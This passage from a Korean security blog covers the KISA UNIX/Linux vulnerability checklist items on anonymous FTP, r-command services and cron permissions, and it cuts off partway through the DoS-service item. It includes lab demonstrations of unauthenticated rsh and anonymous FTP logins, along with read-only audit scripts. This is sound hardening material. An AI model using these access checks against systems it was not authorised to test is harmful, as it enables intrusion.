<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>/etc/passwd 파일에 ftp 계정 존재 여부 확인<br /><code>#cat /etc/passwd | grep &quot;ftp&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="FTP-계정-존재-여부-확인"><a href="#FTP-계정-존재-여부-확인" class="headerlink" title="FTP 계정 존재 여부 확인"></a>FTP 계정 존재 여부 확인</h2><br>

<blockquote>
<p># cat /etc/passwd | grep &quot;ftp&quot;</p>
</blockquote>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-20/grep.png">

<br>

<br>

<h2 id="Anonymous-FTP-접속-여부-확인"><a href="#Anonymous-FTP-접속-여부-확인" class="headerlink" title="Anonymous FTP 접속 여부 확인"></a>Anonymous FTP 접속 여부 확인</h2><br>

<blockquote>
<p># ftp 192.168.219.105</p>
</blockquote>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-20/ftp.png">

<br>

<p><code>Anonymous</code> 계정으로 접속이 되는 것을 볼 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) 일반 FTP - Anonymous FTP 접속 제한 설정 방법<br /><code>/etc/passwd</code> 파일에서 <code>ftp</code> 또는 <code>anonymous</code> 계정 삭제<br />SOLARIS, LINUX, HP-UX 설정 : <code>#userdel ftp</code><br />AIX 설정 : <code>#rmuser ftp</code><br /><br />2) ProFTP - Anonymous FTP 접속 제한 설정 방법<br /><code>conf/proftpd.conf</code> 파일의 <code>anonymous</code> 관련 설정 중 <code>User</code>, <code>Useralias</code> 항목 주석처리<br />(proftpd.conf 파일의 위치는 운영체제 종류별로 상이함)<br /><br />3) vsFTP - Anonymous FTP 접속 제한 설정 방법<br />vsFTP 설정파일 (<code>/etc/vsftpd/vsftpd.conf</code> 또는 <code>/etc/vsftpd.conf</code>)에서 <code>anonymous_enable=NO</code> 설정</td>
</tr>
</tbody></table>
<br>

<br>

<p><code>/etc/vsftpd/vsftpd.conf</code> 파일에서 <code>anonymous_enable=NO</code>로 설정해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-20/anonymous.png">

<br>

<br>

<p><code>Anonymous</code> 계정으로 로그인 실패하였습니다.<br><br></p>
<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-20/ftp_2.png">

<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">AnonymousResult=<span class="string">&quot;&quot;</span></span><br><span class="line">FtpResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">Anonymous=`cat /etc/vsftpd/vsftpd.conf | grep anonymous_enable`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$Anonymous</span>&quot;</span> == *yes* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        AnonymousResult=설정안됨</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        AnonymousResult=설정됨</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">ftp=`cat /etc/passwd | grep <span class="string">&quot;ftp&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$ftp</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        FtpResult=있음</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        FtpResult=없음</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e Anonymous FTP 접속 제한 여부: <span class="string">&quot;<span class="variable">$AnonymousResult</span>&quot;</span> <span class="string">&quot;\n&quot;</span>FTP 계정 존재 여부: <span class="string">&quot;<span class="variable">$FtpResult</span>&quot;</span> | tee /root/result/u-20.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/vsftpd/vsftpd.conf</code> 파일에서 <code>anonymous_enable</code> 단어가 포함된 줄을 변수에 저장 후 <code>yes</code>라는 단어가 포함되어 있으면 <code>Anonymous FTP</code> 접속이 가능하고, 아니라면 불가능이라고 판단할 수 있게 코딩을 하였습니다.</p>
<p><code>/etc/passwd</code> 파일에서 <code>ftp</code>계정이 있는지 확인할 수 있도록 만들었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-20</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-20/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-21 r계열 서비스 비활성화</title>
    <url>/2021/12/20/2021-12-20-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-21%20r%EA%B3%84%EC%97%B4%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%EB%B9%84%ED%99%9C%EC%84%B1%ED%99%94/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>r-command 서비스 비활성화 여부 점검입니다.</p>
<p>항목코드는 <code>U-21</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="r-command"><a href="#r-command" class="headerlink" title="r-command?"></a>r-command?</h2><br>

<p>인증 없이 관리자의 원격접속을 가능하게 하는 명령어들로 <code>rsh</code>, <code>rlogin</code>, <code>rexec</code>, <code>rsync</code> 등이 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>r-command 사용을 통한 원격 접속은 NET Backup 또는 클러스터링 등 용도로 사용되기도 하나, 인증 없이 관리자 원격접속이 가능하여 이에 대한 보안위협을 방지하고자 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>rsh</code>, <code>rlogin</code>, <code>rexec</code> 등의 r-command를 이용하여 <u>원격에서 인증절차 없이</u> 터미널 접속, 쉘 명령어를 실행 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>r-command 활성화된 서버</th>
<th>외부 서버 (비인가자)</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.105</td>
<td>192.168.219.104</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS 5.9<br />이하 버전</td>
<td>r-command 서비스 활성화 여부 확인<br /><code># vi /etc/inetd.conf</code></td>
</tr>
<tr>
<td>AIX</td>
<td><code># cat /etc/inetd.conf | grep rlogin</code> (# 처리 되어 있으면 비활성화)<br /><code># cat /etc/inetd.conf | grep rsh</code> (# 처리 되어 있으면 비활성화)</td>
</tr>
<tr>
<td>HP-UX</td>
<td><code># vi /etc/inetd.conf</code><br />r로 시작하는 필드 존재 시 취약</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td><code># inetadm | egrep &quot;shell|rlogin|rexec&quot;</code><br />r command 관련 데몬 확인</td>
</tr>
<tr>
<td>LINUX<br />(xinetd일 경우)</td>
<td>rsh, rlogin, rexec (shell, login, exec) 서비스 구동 확인<br /><code># ls -alL /etc/xinetd.d/* | egrep &quot;rsh|rlogin|rexec&quot; | egrep -v &quot;grep|klogin|kshell|kexec&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="r-command-활성화-여부-확인"><a href="#r-command-활성화-여부-확인" class="headerlink" title="r-command 활성화 여부 확인"></a>r-command 활성화 여부 확인</h2><br>

<blockquote>
<p># ls -alL /etc/xinetd.d/* | egrep &quot;rsh|rlogin|rexec&quot; | egrep -v &quot;grep|klogin|kshell|kexec&quot;</p>
</blockquote>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/grep.png">

<br>

<br>

<h2 id="인증-없이-접속-여부-확인"><a href="#인증-없이-접속-여부-확인" class="headerlink" title="인증 없이 접속 여부 확인"></a>인증 없이 접속 여부 확인</h2><br>

<blockquote>
<p># rsh 192.168.219.105</p>
</blockquote>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/rsh.png">

<p><br>인증 없이 접속이 되는 것을 볼 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS 5.9<br />이하 버전,<br />HP-UX</td>
<td>1) r 계열 서비스 활성화 여부 확인<br />    <code># vi /etc/inetd.conf</code><br /><br />2) r로 시작하는 필드 주석처리 후 재가동<br />    (수정 전)<br />    shell    stream    tcp    nowait    root    /usr/sbin/in.rshd    in.rshd<br /><br />    (수정 후)<br />    #shell    stream    tcp    nowait    root    /usr/sbin/in.rshd    in.rshd<br /><br />SOLARIS) <code># kill -HUP [inetd PID]</code><br />HP-UX) <code># inetd -c</code></td>
</tr>
<tr>
<td>AIX</td>
<td>1) r 계열 서비스 활성화 여부 확인<br />    <code># cat /etc/inetd.conf |grep rlogin</code> (# 처리 되어 있으면 비활성화)<br />    <code># cat /etc/inetd.conf |grep rsh</code> (# 처리 되어 있으면 비활성화)<br />    <code># cat /etc/inetd.conf |grep exec</code> (# 처리 되어 있으면 비활성화)<br /><br />2) <code>/etc/hosts.equiv</code> 파일은 TRUSTED 시스템을 등록<br /><br />3) <code>.rhosts</code> 파일은 사용자 별로 ‘r’command를 통해 접근이 가능하도록 설정할 수 있음($HOME/.rhosts)</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>1) r’command 관련 데몬 확인<br />    <code>svc:/network/login:rlogin</code><br />    <code>svc:/network/rexec:default</code><br />    <code>svc:/network/shell:kshell</code><br /><br />2) inetadm -d “중지하고자 하는 데몬” 명령으로 데몬 중지<br />    <code># inetadm -d svc:/network/login:rlogin</code><br />    <code># inetadm -d svc:/network/rexec:default</code><br />    <code># inetadm -d svc:/network/shell:kshell</code></td>
</tr>
<tr>
<td>LINUX<br />(xinetd일 경우)</td>
<td>1) vi 편집기를 이용하여 <code>/etc/xinetd.d/</code> 디렉터리 내 <code>rlogin</code>, <code>rsh</code>, <code>rexec</code> 파일 열기<br /><br />2) 아래와 같이 설정 (Disable = yes 설정)<br />    <img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/vi.png"><br /><br />3) xinetd 서비스 재시작<br />    <code># service xinetd restart</code></td>
</tr>
<tr>
<td>r-command 사용시</td>
<td>1) r command 사용을 허용하는 호스트 및 계정 설정<br />    - <code>.rhosts</code>, <code>hosts.equiv</code> 파일에 접근을 허용하는 IP 명시 (공인 IP 설정은 금지)<br />    - <code>.rhosts</code>, <code>hosts.equiv</code> 파일의 퍼미션을 600 이하로 설정<br />    - 필요시 <code>TCP_Wrapper</code>를 이용하여 접근을 허용하는 IP를 등록하여 추가 보안 설정</td>
</tr>
</tbody></table>
<br>

<br>

<p><code>/etc/xinetd.d/rlogin</code> 파일에서 <code>disable=yes</code>로 설정해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/vi.png">

<br>

<br>

<p><code>rlogin</code> 접속 실패했습니다.<br><br></p>
<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/rsh_2.png">

<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line">RcommandResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ls -al /etc/xinetd.d/* | egrep <span class="string">&quot;rsh|rlogin|rexec&quot;</span> | egrep -v <span class="string">&quot;grep|klogin|kshell|kexec&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=활성화</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=비활성화</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">Rcommand=`cat /etc/xinetd.d/r* | grep <span class="built_in">disable</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$Rcommand</span>&quot;</span> == *no* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        RcommandResult=설정 안됨</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        RcommandResult=설정됨</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e R-Command 활성화 여부: <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> <span class="string">&quot;\n&quot;</span>Disable 설정: <span class="string">&quot;<span class="variable">$RcommandResult</span>&quot;</span> | tee /root/result/u-21.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>rsh, rlogin, rexec</code> 서비스가 활성화 상태인지 확인할 수 있도록 만들었습니다.</p>
<p><code>/etc/xinetd.d/r*</code> 파일에서 <code>disable</code> 단어가 포함된 줄을 변수에 저장 후 <code>no</code>라는 단어가 포함되어 있으면 해당 서비스가 비활성화 상태로 판단하고 아니면 활성 상태라고 판단할 수 있도록 만들었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-21</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-22 crond 파일 소유자 및 권한 설정</title>
    <url>/2021/12/21/2021-12-21-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-22%20crond%20%ED%8C%8C%EC%9D%BC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>Cron 관련 파일의 권한 적절성 점검입니다.</p>
<p>항목코드는 <code>U-22</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="Cron"><a href="#Cron" class="headerlink" title="Cron?"></a>Cron?</h2><br>

<p>특정 작업을 정해진 시간에 주기적으로 반복적으로 실행하기 위한 데몬 및 설정입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>관리자 외 cron 서비스를 사용할 수 없도록 설정하고 있는지 점검하는 것을 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>root 외 일반 사용자에게도 crontab 명령어를 사용할 수 있도록 할 경우 고의 또는 실수로 불법적인 예약 파일 실행으로 시스템 피해를 일으킬 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>cron 활성화된 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.105</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>Cron 관련 파일 권한 확인<br /><code># ls -al /usr/bin/crontab</code><br /><code>rw-r----- root &lt;cron 접근제어 파일&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="일반-사용자-사용-가능-여부-확인"><a href="#일반-사용자-사용-가능-여부-확인" class="headerlink" title="일반 사용자 사용 가능 여부 확인"></a>일반 사용자 사용 가능 여부 확인</h2><br>

<blockquote>
<p># ls -al /usr/bin/crontab</p>
</blockquote>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-22/ls.png">

<br>

<p>일반 사용자도 사용이 가능하므로 취약합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<blockquote>
<p> <strong>공통설정</strong></p>
</blockquote>
<blockquote>
<ol>
<li><p>crontab 명령어 일반 사용자 권한 삭제 (crontab 명령어 위치는 OS별 다를 수 있음)</p>
<blockquote>
<p>crontab 명령어는 SUID가 설정되어 있으므로 SUID 설정 제거</p>
<p><code># ls -l /usr/bin/crontab</code></p>
<p><code># chmod 750 /usr/bin/crontab</code></p>
</blockquote>
</li>
</ol>
</blockquote>
<blockquote>
<ol start="2">
<li><p>cron 관련 설정파일 소유자 및 권한 설정</p>
<blockquote>
<p><code># chown root &lt;cron 관련 파일&gt;</code></p>
<p><code># chmod 640 &lt;cron 관련 파일&gt;</code></p>
<table>
<thead>
<tr>
<th>관련 설정파일</th>
<th>설명</th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;cron 디렉터리&gt;/crontab</code></td>
<td>예약 작업을 등록하는 파일</td>
</tr>
<tr>
<td><code>/etc/cron.hourly</code> <code>/etc/cron.daily</code><br /><code>/etc/cron.weekly</code> <code>/etc/cron.monthly</code></td>
<td>시간, 일, 주, 월 단위 실행 스크립트 등록</td>
</tr>
<tr>
<td><code>/var/spool/cron/</code> 또는 <code>/var/spool/cron/crontabs/</code></td>
<td>사용자 별 설정된 cron 작업 목록</td>
</tr>
<tr>
<td><code>cron.allow</code> <code>cron.deny</code></td>
<td>crontab 명령어 허용(차단) 사용자 등록</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>OS</th>
<th>관련 설정파일 위치</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code>/etc/cron.d/</code></td>
</tr>
<tr>
<td>LINUX</td>
<td><code>/etc/</code></td>
</tr>
<tr>
<td>AIX, HP-UX</td>
<td><code>/var/adm/cron/</code></td>
</tr>
</tbody></table>
</blockquote>
</li>
</ol>
</blockquote>
<br>

<br>

<blockquote>
<p><strong>crontab 명령어를 일반사용자에게 허용하는 경우</strong></p>
</blockquote>
<blockquote>
<ol>
<li><p><code>/etc/cron.d/cron.allow</code> 및 <code>/etc/cron.d/cron.deny</code> 파일의 소유자 및 권한 변경</p>
<blockquote>
<p><code># chown root /etc/cron.d/cron.allow</code></p>
<p><code># chmod 640 /etc/cron.d/cron.allow</code></p>
<p><code># chown root /etc/crond/cron.deny</code></p>
<p><code># chmod 640 /etc/cron.d/cron.deny</code></p>
</blockquote>
</li>
</ol>
</blockquote>
<blockquote>
<ol start="2">
<li><p><code>/etc/cron.d/cron.allow</code> 및 <code>/etc/cron.d/cron.deny</code> 파일에 사용자 등록</p>
<blockquote>
<p><code># cat /etc/cron.allow</code> (crontab 명령어 사용을 허용하는 사용자 등록)</p>
<p><code># cat /etc/cron.deny</code> (crontab 명령어 사용을 차단하는 사용자 등록)</p>
</blockquote>
</li>
</ol>
</blockquote>
<br>

<br>

<p><code>crontab</code> 명령어 일반사용자 권한을 삭제하였습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-22/cron.png">

<br>

<br>

<p>일반 사용자가 <code>crontab</code> 명령어 사용 시 권한이 없다고 나옵니다.<br><br></p>
<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-22/cron_2.png">

<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">CronResult=<span class="string">&quot;&quot;</span></span><br><span class="line">EtcResult=<span class="string">&quot;&quot;</span></span><br><span class="line">UserResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd=`find /usr/bin/crontab -perm 750 | grep crontab`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$cmd</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        CronResult=설정됨</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        CronResult=설정안됨</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">cmd=`find /etc/cron* -perm 640`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$cmd</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        EtcResult=설정됨</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        EtcResult=설정안됨</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">cmd=`find /var/spool/cron/ -perm 640`</span><br><span class="line">cmd2=`ls /var/spool/cron/`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$cmd2</span>&quot;</span> == <span class="string">&quot;&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        UserResult=비어있음</span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$cmd</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        UserResult=설정됨</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        UserResult=설정안됨</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e crontab 일반사용자 권한: <span class="string">&quot;<span class="variable">$CronResult</span>&quot;</span> <span class="string">&quot;\n&quot;</span>/etc/cron* 권한: <span class="string">&quot;<span class="variable">$EtcResult</span>&quot;</span> <span class="string">&quot;\n&quot;</span>사용자별 cron 작업 목록 권한: <span class="string">&quot;<span class="variable">$UserResult</span>&quot;</span> | tee /root/result/u-22.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/usr/bin/crontab</code>의 권한이 <code>750</code>인지, <code>/etc/cron*</code> 파일들의 권한이 <code>640</code>인지 확인할 수 있도록 만들었습니다.</p>
<p>사용자별 설정된 cron 작업 목록이 있는 <code>/var/spool/cron/</code> 경로에는 파일이 있는지 확인하고, 만약 있다면 권한이 <code>640</code>인지 확인할 수 있도록 만들었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-22</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-22/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-23 DOS 공격에 취약한 서비스 비활성화</title>
    <url>/2021/12/21/2021-12-21-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-23%20DOS%20%EA%B3%B5%EA%B2%A9%EC%97%90%20%EC%B7%A8%EC%95%BD%ED%95%9C%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%EB%B9%84%ED%99%9C%EC%84%B1%ED%99%94/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>사용하지 않는 DOS 공격에 취약한 서비스의 실행 여부 점검입니다.</p>
<p>항목코드는 <code>U-23</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS?"></a>DOS?</h2><br>

<p>Denial of Service attack의 약자로 시스템을 악의적으로 공격해 해당 시스템의 자원을 부족하게 하여 원래 의도 된 용도로 사용하지 못하게 하는 공격입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>시스템 보안성을 높이기 위해 취약점이 많이 발표된 <code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> <code>ntp</code> <code>snmp</code> 등의 서비스를 중지합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>해당 서비스가 활성화되어 있는 경우 시스템 정보 유출 및 DoS의 대상이 될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.105</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
